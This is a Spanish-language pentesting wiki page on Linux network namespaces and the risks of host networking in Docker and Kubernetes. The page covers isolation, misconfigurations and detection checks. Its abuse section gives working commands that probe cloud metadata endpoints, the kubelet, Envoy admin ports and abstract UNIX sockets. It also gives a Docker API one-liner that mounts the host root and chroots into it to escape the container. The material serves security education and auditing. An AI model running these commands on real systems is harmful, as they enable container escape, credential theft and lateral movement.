# Namespace de red

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El namespace de red aísla recursos relacionados con la red, como interfaces, direcciones IP, tablas de enrutamiento, estado ARP/neighbor, reglas del firewall, sockets, el namespace abstracto de sockets del dominio UNIX y el contenido de archivos como `/proc/net`. Por eso un container puede tener lo que parece su propio `eth0`, sus propias rutas locales y su propio dispositivo loopback sin poseer la pila de red real del host.

Desde el punto de vista de la seguridad, esto es importante porque el aislamiento de red implica mucho más que el binding de puertos. Un namespace de red privado limita lo que el workload puede observar o reconfigurar directamente. Cuando ese namespace se comparte con el host, el container puede obtener repentinamente visibilidad sobre los listeners del host, los servicios locales del host, los endpoints AF_UNIX abstractos y los puntos de control de red que nunca debieron exponerse a la aplicación.

## Funcionamiento

Un namespace de red recién creado comienza con un entorno de red vacío o casi vacío hasta que se le conectan interfaces. Los container runtimes crean o conectan interfaces virtuales, asignan direcciones y configuran rutas para que el workload tenga la conectividad esperada. En deployments basados en bridges, esto normalmente significa que el container ve una interfaz respaldada por veth conectada a un bridge del host. En Kubernetes, los plugins CNI gestionan la configuración equivalente para el networking de los Pods.

Esta arquitectura explica por qué `--network=host` o `hostNetwork: true` supone un cambio tan drástico. En lugar de recibir una pila de red privada preparada, el workload se une a la pila real del host.

## Lab

Puedes ver un namespace de red casi vacío con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Y puedes comparar los contenedores normales y los que usan la red del host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
El contenedor con la red del host ya no tiene su propia vista aislada de sockets e interfaces. Ese cambio por sí solo ya es significativo, incluso antes de preguntar qué capabilities tiene el proceso.

## Uso del runtime

Docker y Podman normalmente crean un network namespace privado para cada contenedor, a menos que se configuren de otra forma. Kubernetes suele asignar a cada Pod su propio network namespace, compartido por los contenedores dentro de ese Pod, pero separado del host. Esto significa que `127.0.0.1` normalmente es local al Pod y no al contenedor: un listener enlazado únicamente a localhost en un contenedor suele ser accesible desde sus sidecars y contenedores hermanos. Los sistemas Incus/LXC también proporcionan un aislamiento basado en network namespaces muy completo, normalmente con una mayor variedad de configuraciones de redes virtuales.

El principio general es que las redes privadas son el límite de aislamiento predeterminado, mientras que la red del host es una exclusión explícita de ese límite.

## Configuraciones incorrectas

La configuración incorrecta más importante consiste simplemente en compartir el network namespace del host. A veces se hace por rendimiento, monitorización de bajo nivel o comodidad, pero elimina uno de los límites más claros disponibles para los contenedores. Los listeners locales del host pasan a ser accesibles de forma más directa, los servicios accesibles únicamente desde localhost pueden quedar expuestos y capabilities como `CAP_NET_ADMIN` o `CAP_NET_RAW` se vuelven mucho más peligrosas, porque las operaciones que habilitan ahora se aplican al propio entorno de red del host.

Otro problema es conceder demasiadas capabilities relacionadas con la red incluso cuando el network namespace es privado. Un namespace privado ayuda, pero no hace que los raw sockets ni el control avanzado de red sean inofensivos.

En Kubernetes, `hostNetwork: true` también cambia hasta qué punto puedes confiar en la segmentación de red a nivel de Pod. Kubernetes documenta que muchos network plugins no pueden distinguir correctamente el tráfico de los Pods con `hostNetwork` al realizar coincidencias mediante `podSelector` / `namespaceSelector` y, por tanto, lo tratan como tráfico normal del nodo. Desde el punto de vista de un atacante, esto significa que un workload comprometido con `hostNetwork` normalmente debe tratarse como un foothold de red a nivel de nodo, en lugar de como un Pod normal que sigue limitado por las mismas suposiciones de las policies que los workloads de overlay network.

## Abuso

En configuraciones con un aislamiento débil, los atacantes pueden inspeccionar los servicios que están escuchando en el host, acceder a endpoints de gestión enlazados únicamente a loopback, esnifar o interferir con el tráfico dependiendo de las capabilities y del entorno concretos, o reconfigurar el enrutamiento y el estado del firewall si `CAP_NET_ADMIN` está presente. En un cluster, esto también puede facilitar el movimiento lateral y el reconocimiento del control plane.

Si sospechas que se está utilizando la red del host, empieza confirmando que las interfaces y los listeners visibles pertenecen al host y no a una red aislada del contenedor:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Los servicios que solo escuchan en loopback suelen ser el primer descubrimiento interesante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Los sockets UNIX abstractos son otro objetivo fácil de pasar por alto porque están limitados al namespace de red, aunque no parecen listeners TCP/UDP y quizá no existan como rutas del sistema de archivos bajo `/run`. Por lo tanto, un contenedor con la red del host puede heredar acceso a canales de control exclusivos del host que nunca se montaron mediante bind en el contenedor:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Un ejemplo histórico fue el bug de exposición del abstract socket de `containerd-shim`, pero la lección general es más importante que el CVE específico: una vez que una carga de trabajo se une al network namespace del host, los servicios AF_UNIX abstractos también pasan a formar parte de la superficie de ataque. Si esos sockets parecen relacionados con el runtime o administrativos, pasa a [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Si hay capabilities de red presentes, comprueba si la carga de trabajo puede inspeccionar o alterar el stack visible:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
En kernels modernos, el host networking junto con `CAP_NET_ADMIN` también puede exponer la ruta de paquetes más allá de simples cambios en `iptables` / `nftables`. Los qdiscs y filtros de `tc` también están limitados por namespace, por lo que, en un host network namespace compartido, se aplican a las interfaces del host que el contenedor puede ver. Si `CAP_BPF` también está presente, los programas eBPF relacionados con la red, como los loaders de TC y XDP, también adquieren relevancia:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Esto es importante porque un atacante puede ser capaz de duplicar, redirigir, dar forma o descartar tráfico en el nivel de la interfaz del host, no solo reescribir reglas del firewall. En un espacio de nombres de red privado, esas acciones quedan contenidas en la vista del contenedor; en un espacio de nombres del host compartido, pasan a afectar al host.

En entornos de cluster o cloud, el networking del host también justifica hacer un recon local rápido de los servicios de metadata y de los servicios adyacentes al control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
En Kubernetes, recuerda que comprometer **cualquier** container de un Pod multi-container también proporciona acceso a los listeners de localhost abiertos por los containers sibling y sidecars, porque todo el Pod comparte un único network namespace. Esto es especialmente relevante con service-mesh, observability y helper containers cuyas interfaces de administración o debug están intencionadamente restringidas al interior del Pod en lugar de estar disponibles para todo el cluster:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Trata "bound to localhost" como **Pod-private**, no **container-private**. Después de que un container del Pod se vea comprometido, esa suposición deja de ser válida.

### Ejemplo completo: Host networking + acceso al runtime local / Kubelet

Host networking no proporciona automáticamente host root, pero a menudo expone servicios a los que intencionadamente solo se puede acceder desde el propio node. Si uno de esos servicios está débilmente protegido, host networking se convierte en una vía directa de privilege-escalation.

Docker API en localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet en localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- compromiso directo del host si una API de runtime local está expuesta sin la protección adecuada
- reconocimiento del cluster o movimiento lateral si kubelet o los agentes locales son accesibles
- manipulación del tráfico o denegación de servicio cuando se combina con `CAP_NET_ADMIN`

## Comprobaciones

El objetivo de estas comprobaciones es determinar si el proceso tiene una pila de red privada, qué rutas y listeners son visibles, y si la vista de red ya parece propia del host antes incluso de probar las capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Qué es interesante aquí:

- Si `/proc/self/ns/net` y `/proc/1/ns/net` ya parecen propios del host, es posible que el container esté compartiendo el network namespace del host u otro namespace no privado.
- `lsns -t net` y `ip netns identify` son útiles cuando el shell ya está dentro de un namespace con nombre o persistente y quieres correlacionarlo con los objetos de `/run/netns` desde el lado del host.
- `ss -lntup` es especialmente valioso porque revela listeners que solo escuchan en loopback y endpoints de administración locales. `ss -xap` y `/proc/net/unix` añaden la vista de los abstract sockets que las búsquedas habituales de sockets en el sistema de archivos no detectan.
- Las rutas, los nombres de las interfaces, el contexto del firewall, el estado de `tc` y los attachments de eBPF adquieren mucha más importancia si `CAP_NET_ADMIN`, `CAP_NET_RAW` o `CAP_BPF` están presentes.
- En Kubernetes, un fallo en la resolución del nombre de un service desde un Pod con `hostNetwork` puede significar simplemente que el Pod no está usando `dnsPolicy: ClusterFirstWithHostNet`, no que el service esté ausente.
- En los Pods con múltiples containers, los listeners de localhost pertenecen a todo el network namespace del Pod. Por tanto, comprueba los sidecars y los containers hermanos antes de asumir que un puerto que solo escucha en loopback es inaccesible desde el container comprometido.

Al revisar un container, evalúa siempre el network namespace junto con el conjunto de capabilities. Usar el networking del host junto con capabilities de red potentes implica una postura de seguridad muy diferente a usar bridge networking con un conjunto limitado de capabilities predeterminadas.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` and abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
